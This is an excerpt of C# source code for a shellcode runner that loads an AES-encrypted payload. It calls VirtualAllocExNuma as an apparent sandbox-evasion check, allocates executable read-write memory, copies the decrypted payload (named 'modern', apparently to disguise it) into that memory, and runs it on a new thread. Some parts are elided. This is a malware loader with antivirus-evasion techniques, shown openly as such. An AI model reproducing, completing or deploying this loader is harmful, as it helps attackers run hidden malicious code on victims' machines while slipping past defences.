...
namespace ShellcodeRunnerCSharpAESEncrypted
{
    class Program
    {
        ...
        public unsafe static void Executemodern(byte[] modern)
        {

            void* mem = PInvoke.VirtualAllocExNuma(PInvoke.GetCurrentProcess_SafeHandle(), null, (UIntPtr)0x1000, VIRTUAL_ALLOCATION_TYPE.MEM_COMMIT | VIRTUAL_ALLOCATION_TYPE.MEM_RESERVE, 0x4, 0);
            if (mem == null)
            {
                return;
            }
            ...
            UIntPtr size = (UIntPtr)(uint)modern.Length;
            void* funcAddr = PInvoke.VirtualAlloc(null, size, VIRTUAL_ALLOCATION_TYPE.MEM_COMMIT, PAGE_PROTECTION_FLAGS.PAGE_EXECUTE_READWRITE);
            Marshal.Copy(modern, 0, (IntPtr)funcAddr, modern.Length);
            Windows.Win32.System.Threading.LPTHREAD_START_ROUTINE allocatedMemoryPointer = (Windows.Win32.System.Threading.LPTHREAD_START_ROUTINE)Marshal.GetDelegateForFunctionPointer((IntPtr)funcAddr,
                typeof(Windows.Win32.System.Threading.LPTHREAD_START_ROUTINE));
            HANDLE hThread = PInvoke.CreateThread(null, (UIntPtr)0, allocatedMemoryPointer, (void*)0, 0);
            PInvoke.WaitForSingleObject(hThread, 0xFFFFFFFF);
        }
        ...
        static unsafe void Main(string[] args)
        {
            ...
            if (aesKey.Length == 16 || aesKey.Length == 24 || aesKey.Length == 32)
            {
                ...
                if (modern == null)
                {
                    Console.Write("Decryption failed. modern is null.<br />");
                    return;
                }
            ...
            {
                Console.Write("Invalid key length. Key must be 16, 24, or 32 bytes.<br />");
            }
